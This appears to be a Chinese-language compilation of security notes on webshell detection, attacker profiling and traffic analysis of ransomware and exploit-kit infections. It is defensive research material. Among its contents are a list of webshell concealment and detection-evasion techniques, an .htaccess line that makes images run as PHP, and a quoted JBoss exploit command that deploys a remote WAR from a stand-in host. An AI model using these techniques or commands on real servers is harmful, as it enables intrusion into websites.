@@ -1,0 +1,754 @@
+
+#Webshell之威胁情报分析（1）--工具同源分析（作者画像）
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1152849295&idx=1&sn=a9f212de0bb140c86ccde2905572bb83&scene=4#wechat_redirect
+
+工具同源分析，其实就是找出攻击工具或木马的作者，类似“星系”，我们要“打击”攻击者，同时也要找到“恶意工具”的制造者。
+这里主要看图，就不详细介绍，通过大量的Webshell样本，结合威胁情报库进行深入的分析，找出攻击工具的作者。
+
+#webshell之威胁情报分析（2）--攻击者画像
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1165171317&idx=1&sn=2f88680e64c67950c788bf367ab45e91&scene=4#wechat_redirect
+
+利益还是黑产的驱动力,黑产的攻击手法一般都是追求大规模，采用自动化的方式，追求效益最大化。我们可以根据大量的信息对攻击者进行画像。攻击者画像一般要搞清楚三部分攻击者身份、所用的工具（武器）、攻击手法。
+
+1. 攻击者身份
+
+![攻击者身份](./img/webshell/攻击者身份.png)
+1. 工具或武器
+
+![攻击者武器](./img/Webshell/攻击者武器.png)
+1. 攻击手法
+
+![攻击者手法](./img/webshell/攻击者手法.png)
+
+通过威胁情报，从被动安全到主动安全的转变，你将会赢得整个战役，而不是一场战斗。（Use threat intelligence Win the war – not the battle）
+
+#Webshell安全检测(3)--WeBaCoo网站后门特征分析
+
+WeBaCoo (Web Backdoor Cookie) script-kit是一个小巧的、隐蔽的php后门，它提供了一个可以连接远程web服务器并执行php代码的终端。WeBaCoo使用HTTP响应头传送命令结果，shell命令经base64编码后隐藏在Cookie头中。
+
+#结合威胁情报的Webshell事件处理谈(1)--结合kill chain的攻击还原
+
+整个过程主要包含了三个阶段。
+1. 战术情报：主要通过kill chain的还原，描述了攻击的整个过程。
+
+    基于流量的webshell分析，比日志分析、样本分析而言，可获得的信息更多，可以做到：
+    1. 基于行为的payload分析，发现未知的、伪装性的webshell；
+    2. 攻击过程的还原，可以从kill chain的角度来还原整个攻击过程。
+
+    攻击总体过程分析:
+    1. 告警(线索) 首先通过基于流量的webshell分析引擎，告警发现多个疑似webshell流量。
+    1. 过程还原 依据此线索，我们开始逐步的深入分析，还原整个的攻击过程
+
+2. 战略情报：结合样本与威胁情报库，对攻击者、攻击工具、攻击手法等进行深入分析与画像。
+3. 通过前面的分析，形成机读的IOC，进行信息共享，达到预警、预防、反制的目的。
+
+#结合威胁情报的Webshell事件处理谈(2)--攻击画像与机读IOC
+整个过程主要包含了三个阶段。
+1. 战术情报：主要通过kill chain的还原，描述了攻击的整个过程。
+2. 战略情报：结合样本与威胁情报库，对攻击者、攻击工具、攻击手法等进行深入分析与画像。
+
+    战略情报主要包括攻击者画像、受害者画像（整体受害者的损失和影响范围等）
+    1. 通过对对所捕获的webshell流量样本进行分析，可获得如下信息。包括文件名、MD5 hash、webshell密码、C2、action等
+    1. 同时对样本进行了综合分析，得到样本的网络流量特征，以及具体的payload。可以作为webshell的网络流量特征加到相关安全产品中进行检测。
+    1. 根据工具的画像分析，对C2服务器（61.129.XX.XX) 进行进一步的分析可以得到相关的信息。包括C2服务器上的用户名密码等信息
+    1. 
+3. 通过前面的分析，形成机读的IOC，进行信息共享，达到预警、预防、反制的目的。
+
+#Webshell安全检测(4):Weevely样本后门特征分析
+
+weevely是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，并且加入了一些特殊干扰字符，常见的主流杀毒软件以及云上的安全检测引擎都很难发现，笔者试验了国内对多个云计算安全检测系统都未能发现此webshell。
+
+通过分析weevely代码程序，得知程序有两种方式可以传递shell命令，分别是Cookie头域和Referer头域。简单分析下Cookie头域传递 shell命令方式，CmdRequest类中的setPayload函数在处理shell命令，首先利用base64.b64encode函数把shell命令加密，将加密后的命令，分三部分赋值给Cookie变量，调用pollute_with_random_str函数给shell命令添加混淆的特殊字符。
+
+#webshell的隐藏、伪装技巧
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1218156247&idx=1&sn=42be0e0c69a0755671b7e4f85fd4d782&scene=4#wechat_redirect
+
+1. 改默认密码
+1. 改名，融入上传后所在的文件夹，将名字改得较为"普通"(例如indexi.php)，让人很难直观地看出文件的异常。
+1. 文件大小的伪装处理(像正常脚本)
+1. 将webshell的payload代码插入到网站原本的正常.php文件中(插入法)，普通的正则匹配很难发现这种webshell
+1. webshell文件混淆:
+
+    1. 变量名混淆
+    1. 插入大量无用的随机字符串
+1. 变形
+    1. 仿照一些标准、正常的文件名。例如在Joomla的目录下放置LICESNE.php这种"不容易引起视觉可疑"的文件名，并且这些文件的内容都极其类似正常的LICENCE文件 
+    1. 执行函数变形
+    1. 执行代码变形(payload变形)
+
+        1. 将webshell的执行代码payload编码成base64的格式: bypass本地特征码检测软件
+        1. 将webshell的执行代码payload使用加密算法(例如RSA1024)
+
+            1. 私钥和文件保存在一起: bypass网络流量恶意检测软件，因为这样就可以直接在网络中传输密文。缺点是对于本地文件来说，解密当前webshell加密算法的key是暴露的
+            1. 私钥和通过网络流量传输的命令放在一起: bypass本地特征码检测软件，在本机文件中不出现解密密文的key，保证了本地webshell文件的保密性。缺点是在网络流量中出现了key，通过流量分析可以截获并解密之
+
+    1. 执行函数和执行代码同时变形
+
+1. 加花
+    1. 在webshell代码中加入一些随机字符串等混淆因子，可以绕过一部分"基于正则"的检测软件
+
+1. 多态
+
+    1. 在实际的webshell开始执行前，典型的对传入的参数做一些判断，只有匹配条件时才会进入真正的执行路径。这种多态技术不仅可以躲过一些正则webshell检测系统，还可以避免被某些动态沙箱的检测软件捕获到(因为动态沙箱很难模拟出这个webshell脚本所需要的"启动参数")
+
+#高隐藏性webshell分析:Weevely 3.2 流量特征(一)
+
+Weevely生成的混淆的PHP后门脚本，以逃逸IDS 、WAF等安全设备的检测。Weevely的后门采用专有的加密方式对内容进行加密，同时把命令拆分在多个数据包中进行传输。
+
+从Weevely3.2抓取的网络数据中请求头和响应体中 shell指令和响应的内容分别进行了加密处理。Base64解码响应体内容得出乱码。通过对专有算法的分析，对WatcherLab解码响应体内容
+
+#如何检测隐藏的Webshell(三) Weevely.img
+
+ Weevely除了可以实时生成一个完全唯一的PHP Webshell之外其实还有另外一种模式就是将生成的代码插入到一个图片文件中，即img模式，但是最新版的Weevely却取消了这个功能，可能是作者觉得img模式太鸡肋吧，需要.htaccess支持确实是硬伤，而且代码插入图片中会导致图片文件特征太过明显基于文件的检测很容易就能检测出一个异常图片文件从而暴露身份，毕竟我们玩的就是“隐身”。
+
+还是很明显的吧，在插入代码的同时还会生成一个.htaccess文件，目的是让服务器将jpg图片当成PHP代码来执行，内容如下:
+`AddType application/x-httpd-php .jpg`
+
+在成功的制作一个Weevely.img后门之后我们将文件放到一个实验用的环境中，并使用Weevely的客户端连接Webshell。进行了几个命令执行的操作后，打开抓取的网络流量数据，发现payload被加密了
+
+![Weevely.img通信加密](./img/webshell/Weevely_img通信加密.png)
+
+Weevely的通信隐藏在正常流量中，通过大量的流量样本守望者开发的检测系统能够发现Weevely Request Cookie域中的模式特征并配合Response来确定某个流量是否为疑似Weevely,并将疑似Weevely的Cookie域经过去掉第一个参数，去掉干扰符号，重组，最后解密的过程发现具有攻击性的Payload。
+
+#一代版本一代神？：CKnife跨平台菜刀解剖
+
+客户端的话这次“更新”完全重写了原先的菜刀，使用JAVA来写这样就实现了跨平台的功能，可以在Windows、Mac OS X、Kali等平台上,理论上只要能安装JVM手机都可以运行，实际的操作和老菜刀也没有太大的差别。
+客户端的特色有两个，
+1. 跨平台
+1. 配置参数可调。
+
+通过对比上述两个过程我们可以很明显的对比出区别来，默认配置的中版本菜刀CKnife在处理参数执行和传递方面没有老菜刀chopper更“安全”，老菜刀做了ASCII编码来逃避某些IDS和WAF的检测，但是新菜刀CKnife却没有。但是！记住新菜刀CKnife的参数是可调的哦，你懂的！
+
+#Webshell安全检测篇(1)--基于流量的检测方式
+
+
+webshell一般有三种检测方式：
+1. 基于流量模式
+1. 基于agent模式（实质是直接分析webshell文件）
+1. 基于日志分析模式
+
+##基于流量的webshell检测思考
+
+在研究了上述两种模型的检测之后就考虑能否在网络流量上实现Webshell分析和检测。毕竟要实现Agent模型和日志分析模型需要的成本太大不仅要考虑兼容性问题还需要考虑性能及安全性的问题，而如果采用流量（网关）型检测的话成本和部署难度会减小很多，所以有了此文基于流量（网关型）的Webshell检测方法。
+
+要实现通过网络流量检测Webshell首先就需要对流量进行“可视化”，“可视化”的方法有很多可以借鉴目前市场上一些成熟的框架来实现这里就不再多述。我们主要讨论在Webshell被上传到服务器及Webshell在访问过程中网络流量中产生的payload来实现Webshell检测。
+
+##上传过程中的Payload
+
+我们知道正常的网站在有需要的情况下通常会允许上传一些“无害”的文件但是不会允许上传以脚本文件形式存在的文件例如：PHP、ASP、JSP等，而Webshell就是以这种脚本文件的形式存在并且被服务器解析的。在上传过程中虽然不会出现一些攻击payload。但是要向服务器上传文件所以也会产生一些和上传相关的Payload。下面我们讨论一下常见的两种上传的Webshell的形式即上传“大马”和“小马”
+
+1. 上传"大马"
+
+    这种方式通过POST直接上传一个Webshell文件或者经过简单的变形然后上传到服务器上,如下面的一个例子：
+    `2009-02-10 06:32:58 W3SVC77065997 XXXX.XXXX.XXXX.XXXX POST /lesson_manage/upload/40/ASP.asp – 80 – XXXX.XXXX.XXXX.XXXX Mozilla/4.0+compatible;+MSIE+6.0; 200 0 0`
+    从上面这条访问记录中能够发现如下关键特：POST upload ASP.asp 200 通过这几个关键特征的就能够分析出ASP.php可能是一个疑似Webshell。
+1. 上传"小马"
+
+    在不能直接上传“大马”Webshell的情况下黑客通常会上传一个“小马”以协助完成上传“大马”或者上传一句话Webshell并配合一个客户端实现控制服务器，这里我们也不讨论如何上传“小马”以及一句话Webshell。我们只讨论如何利用“小马”来上传“大马”。
+    在不能直接上传“大马”Webshell的情况下黑客通常会上传一个“小马”以协助完成上传“大马”或者上传一句话Webshell并配合一个客户端实现控制服务器，这里我们也不讨论如何上传“小马”以及一句话Webshell。我们只讨论如何利用“小马”来上传“大马”。 这种方式的特殊点在于不是一个完整的文件在网络中中传输而是一个存在于HTTP协议中的一个参数在网络中传输，传输参数的方式既可能是GET也可能是POST，我们来看下面一个真实的例子：
+
+    ![小马上传大马_payload.png](./img/webshell/小马上传大马_payload.png)
+
+    在上图中我们不难发现这显然是使用一句话木马客户端通过POST的形式正在上传一个Webshell的脚本代码，并且将内容写入一句话木马相同目录下的一个body.asp的文件当中，从而实现上传“大马”。在截取到的流量数据中可以发现，如：act= body.asp value=Execute 等payload，通过在检测这些payload就可以在上传的过程中分析Webshell及其行为。
+
+##访问过程中的Payload
+
+由于Webshell是被制作用来控制服务器或者窃取机密信息的，要实现这些能力攻击者就必须向Webshell发送一些控制指令从而操作Webshell。在控制指令中通常包含特征明显的攻击payload。我们来观察一下如下几种payload：
+
+![访问_payload_1.png](./img/webshell/访问_payload_1.png)
+![访问_payload_2.jpg](./img/webshell/访问_payload_2.jpg)
+
+经过一定的payload积累和规则的定制再经过和其它检测过程相结合可以形成一套基于流量分析Webshell分析引擎，并且可以该引擎可以很方便的嵌入到现有的网关型设备或云上实现Webshell的深度分析。 
+
+
+#Webshell安全检测篇(2)--深入用户的内心
+
+1. 程序员：一个可以执行的web脚本文件。意味着：就是个脚本。
+1. 黑客：一个可以拿来控制网站的东西。意味：网站已经搞定，尽量隐藏自己的身份别被发现，同时可以进行后续的破坏行为。
+1. 用户（站长）： 发现了Webshell，麻烦来了,认真的管理员都会想到很多很多的问题。网站有漏洞，已经被别人攻击了。我该怎么办？
+
+简单说我受破坏的程度，如何避免不再出现类似情况，同时关心黑客的来源身份手段等信息（黑客画像）所以Webshell检测系统我们要做的到底是什么？是覆盖WEB类安全事件事后处置的一个平台（或服务）。
+
+主要的功能：
+1. 监测网站是不是被人入侵了。
+1. 根据流量找出攻击者的IP地址。
+1. 结合外部威胁情报对攻击者进行画像，给用户全面的信息。
+1. 基于流量可以还原攻击场景。
+1. 根据攻击场景分析网站存在什么漏洞。
+1. 根据漏洞给用户提供修补加固方案。
+
+用户想要的是什么效果？
+1. 告警准确（该报的报 不该报的不报）。
+1. 告警直观、形象。（可视化好）
+1. 部署成本小：最好0成本部署，或者便利的接入
+1. 告警获取方便（比如微信、短信通知）。（用户才没时间天天去看产品的界面，以后监控类的产品告警信息是不是几乎都不要界面了，或者扔几个牛逼的可视化图让领导看，当然统计类的报表还是需要的）
+1. 告警处理方便：一键式的处理导向，看到告警，我按照自动化的一键式场景，可以方便的自动或人工去处理webshell事件。（傻瓜化处理）
+
+#Webshell安全检测篇(3)--基于行为分析来发现"未知的Webshell"
+
+
+已知的已知，已知的未知，未知的未知，这个最近安全行业也谈的比较多，目前圈内热炒的“威胁情报”，其实应该属于“已知的未知”，对本地来说是未知威胁，其实是别的地方已经发生过的威胁。真正的“未知的未知”怎么办，虽然从没发生过的威胁首次在我们身上发生的概率很小很小，但是目前好多攻击都是窃取管理员的身份或者合法用户身份去做一些貌似合法的操作，这些内部发生的“异常 ”行为，没有外部的“威胁情报”等数据可对比
+
+加密会逐步成为网络流量的常态，基于“协议异常或行为异常”将成为无法解读内容情景下安全威胁检测的重要手段。 基于“内容”检测和基于“行为”检测互补来发现威胁。异常不一定是威胁，但一般来说威胁一定首先是异常。下图也表达了基于白名单的异常行为分析的重要性。
+
+当下的安全攻防一个特点就是，未知攻击会越来越多，你所面临的攻击工具可能是从来没有使用过（或者身边的监控视野范围没有看到过），你手上的webshell样本再多，攻击者总是能制作出新的更轻量级功能更全的webshell，如何发现未知的webshell?如何做到天网恢恢疏而不漏？
+
+##基于流量的Webshell的行为检测
+
+webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测先前我们说到过webshell通信是HTTP协议。基于payload的行为分析，不仅对已知webshell进行检测，还能识别出未知的、伪装性强的webshell。
+
+1. 对webshell的访问特征（IP/UA/Cookie)、payload特征、path特征、时间特征等进行关联分析，以时间为索引，还原攻击事件。
+1. 基于异常的HTTP请求
+
+    Webshell总有一个HTTP请求，如果在网络层监控HTTP请求（没有监控Apache/IIS日志），有一天突然出现一个新的PHP文件请求或者一个平时是GET请求的文件突然有了POST请求，还返回的200，这里就有问题了。
+1. 结合威胁情报，对webshell的来源和作者进行深度分析，充分画像who? when?how?  why？(出于什么目的？竞争对手还是恶意攻击者） how?(攻击方法）
+
+
+##基于沙箱技术的行为特征分析
+
+我们知道中间件需要由某个系统账户来完成启动，所有的WEB脚本文件都通过中间件来完成相应的动作，通过监视系统进程和SQL查询被中间件使用的情况就可以初步的确定在网站中Webshell的存在并且正在运行。再通过中间件来确定最终发起操作的具体脚本文件就可以完成达到最终检测、发现Webshell的目的。
+
+1. 数据库层面检测：通常一个正常的网站所有的数据库操作都通过统一的API来进行的，如果某个脚本文件通过另一种方式来尝试操作数据库的话就可以追踪到这个具体的文件；
+2. 中间件层面检测：通过第三方的定制化插件来和中间件结合能够实现对发起操作的脚本文件的检测；
+3. 系统层面行为检测：webshell起来如果执行系统命令的话，会有进程。比如Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。
+
+#Webshell安全检测篇（4）-基于流量的Webshell分析样例
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1374908522&idx=1&sn=03dc123760f253aeee1e266cf5ecc65c&scene=4#wechat_redirect
+
+我们知道“大马”的目的就是为了提权以及控制。常见的“大马”一般都是功能较多结构也较为复杂的，“单一文件实现众多功能”是“大马”的设计目的之一，一方面大在功能，另一方面大在体积。在形形色色的“大马”中不难总结其中典型的功能。
+
+1. 文件操作：上传、下载、编辑、删除；
+
+    ![上传文件_payload.png](./img/webshell/上传文件_payload.png)
+
+    通过抓取实际的网络流量来获取一对Payload他们分别出现在访问请求中和服务器返回的数据中：
+
+        Request Payload：POST|upfiles|pr.exe
+        Return Payload：200
+    通过上述Payload我们就可以大概总结出以下结论：
+    该服务器可能已经被入侵并且被成功上传Webshell后门，攻击者正在尝试利用Microsoft Windows RPCSS服务隔离本地权限提升漏洞（MS09-012）漏洞进行提权，也意味着该服务器可能已经有很长未安装过系统安全补丁
+1. 数据库操作：连接数据库、脱库、插入数据；
+
+    ![数据库操作_payload.jpg](./img/webshell/数据库操作_payload.jpg)
+
+    可以看到在一个连接数据库的操作过程中流量中也产生了众多的Payload，简单的将POST数据进行URL解码可以看的更明显一些：
+
+        auth[driver]=server&auth[server]=localhost&auth[username]=root&auth[password]=&auth[db]=mysql&auth[permanent]=1
+    再来分析一下Payload对：
+
+        Request Payload：POST|localhost|root|mysql
+        Return Payload：localhost|root|mysql|200|*.sql|user
+    通过上述成对的Payload可以分析出以下结论：
+    攻击者正在试图访问MySQL数据库并且访问了mysql库中的表信息攻击者可以将该mysql库中的表到导出.sql文件
+
+1. 命令执行：提交自定义命令、“大马”预制命令。
+
+    ![命令执行_payload.jpg](./img/webshell/命令执行_payload.jpg)
+    在这个案例中攻击者向服务器发送了一条查看当前权限的命令，服务器在获得指令后运行并将结果通过响应主题反馈给攻击者。我们来分析一下Payload
+
+        Request Payload：POST|act=cmd|cmd=who|precmd
+        Return Payload：200|net authority\|system
+    通过上述总结的Payload可以得出以下结论：
+    服务器已经被入侵，攻击者试图向服务器发送查询中间件运行时所用操作系统权限并获得了满意的结果，接下来这台服务器的悲惨的结局可想而知。
+
+相对于一句话Webshell管理工具而言“大马”在访问过程中的Payload相对来说比较简单也更显而易见，在检测的时候也相对容易一些，但是凡事没有绝对，经过加密和预制命令的Webshell来讲也完全可以逃脱上述Payload检测过程。
+
+
+#Webshell系列(5)--webshell之"看见"的能力分析
+
+下图是一个典型的webshell的攻击序列图，利用web的漏洞，获取web权限，上传小马，安装大马，然后远程调用webshell，执行各种命令，以达到获取数据等恶意目的。
+
+![webshell典型攻击序列图.jpg](./img/webshell/webshell典型攻击序列图.jpg)
+
+##从killchain来分析各阶段“看见”能力
+
+从kill chain来看，靠采集系统自身的流量的技术手段，在前两个阶段Reconnaissance、Weaponise这两个阶段是很难看到行为。（结合威胁情报可以更大范围的看到这两个阶段的信息），基于流量的payload分析技术可以在Delivery、Exploit、Installation、Command &Control (C2)、Action这几个阶段都能看到攻击行为。
+
+![killchain.png](./img/webshell/killchain.png)
+
+##从防护方的“安全对抗”能力视角看
+
+Detect: Can you see/find it?（能否检测到攻击）
+Deny: Can you stop it from happening? （能否避免遭受攻击）
+Disrupt: Can you stop it while it’s happening?（能否阻止正在进行的攻击）
+Degrade: Can you make it not worth it?（能否让攻击者觉得攻击不值得，降低其攻击级别）
+Deceive: Can you trick them [the adversary]?（能否诱骗或重定向攻行为）
+Destroy: Can you blow it up? （能否摧毁攻击者）
+
+##Webshell的检测的三种手段
+从安全防护能力看，检测是第一位的能力，webshell的检测主要有以下几种方式：
+1. 基于流量的webshell检测引擎
+
+    方便部署，通过流量镜像直接分析原始信息。
+    基于payload的行为分析，不仅对已知webshell进行检测，还能识别出未知的、伪装性强的webshell。
+    对webshell的访问特征（IP/UA/Cookie)、payload特征、path特征、时间特征等进行关联分析，以时间为索引，还原攻击事件。
+2. 基于文件的webshell分析引擎
+
+    检测是否包含webshell特征，例如常用的各种函数。
+    检测是否加密（混淆处理）来判断是否为webshell
+    文件hash检测，创建webshell样本hashing库，进行对比分析可疑文件。
+    对文件的创建时间、修改时间、文件权限等进行检测，以确认是否为webshell
+    沙箱技术，根据动态语言沙箱运行时的行为特征进行判断
+3. 基于日志的webshell分析引擎
+
+    支持常见的多种日志格式。
+    对网站的访问行为进行建模，可有效识别webshell的上传等行为
+    对日志进行综合分析，回溯整个攻击过程。
+
+三种检测方式，基于文件的检测，很多时候获取样本的部署成本比较高，同时仅仅靠样本无法看到整个攻击过程。基于日志的有些行为信息在日志中看不到，总体来说还是基于“流量”的看到的信息最多，也能更充分的还原整个攻击过程。
+
+#Metasploit Webshell初探
+
+Metasploit生成的PHP Webshell如下（其实是生产了一个PHP Socket通信Server端）
+
+![Metasploit_PHP_Webshell.png](./img/webshell/Metasploit_PHP_Webshell.png)
+
+WAF产品只检测HTTP协议，GET，POST,cookie等数据内容，Metasploit生成的后门程序可以绕过WAF，Metasploit还可以生成asp,java,android，EXE,DLL后门，对生成后门程序加密，提权操作，原理一样，在这里笔者就不做演示了。
+
+#流量安全分析：恶意邮件&加密勒索病毒攻击分析(1)
+
+1、相关的文件：
+- [原始数据报文](http://www.watcherlab.com/file/download/2016-01-07-traffic-analysis-exercise.pcap)   14.2 MB(14184370字节)
+- [入侵检测系统Snort的事件TXT文件](http://www.watcherlab.com/file/download/2016-01-07-traffic-analysis-exercise-snort-events.txt)   24.0 KB(24009字节)
+- [入侵检测系统Suricata事件的TXT文件](http://www.watcherlab.com/file/download/2016-01-07-traffic-analysis-exercise-suricata-events.txt)     suricata-events.txt   529.8 KB(529780字节)
+
+在Wireshark中打开原始PCAP后, 双击每个数据报文, 可以看到每个IP对应的主机名和MAC地址
+
+#流量安全分析: 恶意邮件&加密勒索病毒攻击分析(2)
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1565298930&idx=1&sn=3f926785ab75ac6812631815634f0cfa&scene=4#wechat_redirect
+
+第一个IP的流量，我们发现了“恶意重定向”，发现var main_color_handle='';\n 没返回别的东西，在这种情况下就没有后续的恶意流量。不用关注这个IP剩下的流量，让我们继续往下看。
+
+第二个IP的流量，我们发现带有压缩js附件的恶意垃圾邮件感染后的活动。在发现初始报警之后，恶意的软件被下载了。
+当恶意软件下载完成，服务器任务是GIF图像，然而，这是一个Windows可执行文件；下图所示
+
+![恶意邮件_windows可执行文件](./img/webshell/恶意邮件_windows可执行文件)
+
+让我们看一下第三个IP的警报。这也是因为一个“恶意重定向”。在Wireshark中检查流量后，通过使用http.request and tcp.srcport eq 49182过滤条件，我们发现了特殊的TCP流。下图所示：
+
+#流量安全分析：通过WordPress系统感染的网络勒索事件分析
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1568952590&idx=1&sn=8e4fb1ab0a938862b2f5518414fc455b&scene=4#wechat_redirect
+
+现在，互联网上很多网站都是基于WordPress内容管理系统来开发的，安全问题也随之而来。研究人员发现，现在有大量的WordPress 网站会向网站访问者悄悄发送勒索软件，其中以TeslaCrypt 最为臭名昭著。
+
+![被注入恶意代码的js_数据流](./img/Webshell/被注入恶意代码的js_数据流)
+
+响应数据内容发现Expolit漏洞利用代码使用了高度混淆的js代码来躲避IPS/WAF等产品检测。
+
+AnglerEK发送经过加密TeslaCrypt payload使用户主机感染。
+
+#流量安全分析(三): teslaCrypt恶意勒索软件入侵(1)
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1581297394&idx=1&sn=280f6fe59e4f23d2d5a064aece5d8a55&scene=4#wechat_redirect
+
+PCAP of the traffic: 2015-08-31-traffic-analysis-exercise.pcap  8.35 MB (8,350,244 bytes)。下载地址：http://pan.baidu.com/s/1dEaCKvf
+
+
+#流量安全分析(三): teslaCrypt恶意勒索软件入侵(2)
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1582694342&idx=1&sn=2124107caa5e5480ac573da28f03a2e6&scene=4#wechat_redirect
+
+用tcpreplay方式在Security Onion（安全洋葱）上回放PCAP，看看能产生什么样的警报。我的安全洋葱VM是建立与Suricata规则集。使用tcpreplay前，我会确保这些规则是更新过的`sudo/usr/bin/rule-update`
+
+    (TCPReplay主要功能是将PCAP包重新发送，用于性能或者功能测试)
+    (Security Onion是用于网络监控和入侵检测)
+
+复制PCAP到安全洋葱VM后，使用下面的命令：`sudo tcpreplay--intf1=eth0 2015-08-31-traffic-analysis-exercise.pcap`等它运行完成。
+
+一旦tcpreplay运行结束后，打开Sguil检查相应结果报警。在这种情况下，发现下列信息Job314/NeutrinoReboot EK.这些都是由Neutrino EK产生的ET警报
+
+#流量安全分析(四): 如何识别EK工具包和攻击链
+
+[原始数据报文下载](http://www.watcherlab.com/file/download/2015-06-30-traffic-analysis-exercise.pcap)
+
+恶意软件的制造者们。为了增加代码分析的难度，混淆（obfuscate）工具被应用到了许多恶意软件（如 0day 挂马、跨站攻击等）当中。分析人员为了掀开恶意软件的面纱，首先就得对脚本进行反混淆（deobfuscate）处理。
+
+在过滤http.request对应这些http request流量做一个汇总。查看下面图片：
+
+一些signature hits是新兴威胁利用Sguil 安全洋葱产生。此标识攻击工具包：
+
+一些来自Talos (Sourcefire VRT)规则集的Signaturehits可以识别EK工具包。
+
+使用wireshark过滤器过滤PACP的流量，可以发现被感染的流量和被入侵的主机。
+
+过滤PACP数据包的UDP协议，你可以发现反向DNS查找（PTR）,并且可以看到开启了NetBIOS通信协议，Network Basic Input/Output System用于局域网通信的一套API
+
+查看EK的流量，你会发现有效载荷进行了混淆处理，使用XOR-ing：
+
+可以提取EK登陆页面，用wireshark快速导出，并且看到混淆的恶意程序的有效载荷在下面两张图中：
+
+使用下面python脚本可以对这个恶意程序的有效载荷进行反混淆处理。
+![python_反混淆](./img/Webshell/python_反混淆.png)
+
+> 在hybrid-analysis.com上有恶意软件反混淆有效载荷的分析。hybrid-analysis.com是个很不错的在线分析网站。
+
+#流量安全分析(五): 如何通过“流量线索”进行恶意程序感染分析
+
+原始PCAP 数据包下载地址:http://www.watcherlab.com/file/download/2015-09-23-traffic-analysis-exercise.pcap(1.5 MB)
+
+我们从被感染的电脑抓取到PCAP数据报文。根据这些流量，弄清楚感染是如何发生的，根本原因是什么。
+
+用wireshark打开PCAP数据包。首先，我们过滤http.request字段，看看有什么可以发现的，如下图：
+
+#由Webshell溯源攻击者的入侵途径
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1638153922&idx=1&sn=0a57031776d3956c1b9fd429d87cbfcf&scene=4#wechat_redirect
+
+前不久接到一次应急响应任务，某集团的网站被种植了后门，我们的工作就是查找攻击者的入侵途径，分析网站存在的安全问题，并清除掉网站上所有的webshell，并找到攻击者的ip地址。
+
+本次任务的难点在于，管理员提供给我们的只有打包后的源码及日志。经过查看各种配置文件，发现受攻击的ip是一台内网的linux服务器，外网ip的80端口由nginx转发到内网的192.168.1.X服务器上的jboss中间件的8080端口。分析到这里，马上会想到可能是jboss中间件出问题了，jboss入侵的大体思路，jboss最常见的漏洞就是jboss命令执行了。随着后续分析的深入，发现也有攻击者利用jboss匿名访问漏洞上传shell。按平时的分析步骤，接下来只需查看日志就可以分析出攻击者是否是利用这种漏洞进行攻击的，但事实上没有这么简单。
+
+我们从打包的文件夹中，找到了半天，也没发现任何有价值的线索，最后查看server.xml文件得知，以下关键内容被注释掉，也就是说jboss的应用程序访问日志记录功能没有开启。
+
+这里就要讲到一个jboss命令执行漏洞的细节了。大家都知道，jboss命令执行漏洞的利用方法是使用`java -jar jboss_exploit_fat.jar -i http://x.x.x.x:8080/invoker/JMXInvokerServletinvoke jboss.system:service=MainDeployer deploy http://www.xxx.com/demo/test111.war`这个命令远程部署一个war包，默认应该是会在/tmp/目录下留下jar包`tmp2255450685281709390test111.war及解压后的tmp2255450685281709390test111-exp.war`文件夹，然后我们访问`http://x.x.x.x:8080/test111/test111.jsp`就成功地拿到一个webshell。
+
+这里需要讲另一个关键点：当jboss中间件重启之后，默认tmp文件夹会全部清空的。那我们是不是没有办法找到jboss命令执行的痕迹了呢。
+
+实际上在对应的localhost文件夹下，java写的webshell会留有相对应的.java、.class文件的，并且这些文件在jboss重启后不会删除的。攻击者通过漏洞上传完webshell后，进行一系列恶意操作之后，通常会清理掉webshell，但是很少有攻击者会考虑到localhost文件夹下也是留有痕迹的。
+
+接下来跳转到localhost目录下，可以发现很多webshell。在这个重要的localhost文件夹下，总共发现了13个webshell后门。
+
+#流量安全分析（六）：通过“流量”分析某用户机器感染木马程序
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1656700759&idx=1&sn=d533f5c210279f6f267b533233c95fb0&scene=4#wechat_redirect
+
+##场景
+某用户电脑使用起来有些反常，怀疑是被黑，但是无法提供其他任何信息。我们可以拿到之前保存的相关时间段和该服务器的流量进行分析。首先取出相关的PCAP数据报文。
+原始数据报文： http://www.watcherlab.com/file/download/2015-02-08-traffic-analysis-exercise
+
+#线索、挖掘、预警—基于威胁情报的一起Webshell的安全分析
+
+http://mp.weixin.qq.com/s?__biz=MzA4MTY1MzE1NA==&mid=1662628301&idx=1&sn=43e8efc36d3e383530085bbbb1633271&scene=4#wechat_redirect
+
+1. 攻击源列表
+1. Webshell样本名称及密码
+1. 攻击源&C2安全分析
+1. 受害者分析
+
+关于通过威胁情报更好的应用在安全防护工作中，守望者的感触如下亮点：
+1. 针对攻击事件分析中，可以使用外部威胁情报平台来进行深入溯源分析（最早攻击时间、使用了哪些域名、IP、whois中注册的email信息等）
+2. 威胁情报标准化提供设备机读，增强现有的检测及防护系统发现的能力，把安全隐患消灭在萌芽状态，阻止攻击者进行二次或多次攻击。
+
+#守望者安全情报—：针对中国移动10086的大量钓鱼网站
+
+钓鱼网站主要分布在银行、证券、保险、电商、支付、众筹、电信、传媒、政府、航空、票务、搜索、邮箱等互联网金融活动频繁行业，覆盖人群众多，影响面巨大。经常遭受网络钓鱼攻击的机构主要有：建设银行、工商银行、中国银联、招商银行、淘宝、中国移动、中央电视台、湖南卫视、浙江卫视、江苏卫视、腾讯、苹果等。
+
+1. 基本数据
+2. 典型两个钓鱼网站
+3. 钓鱼网站列表
+#流量安全分析(七): 如何分析一个攻击数据报文？
+
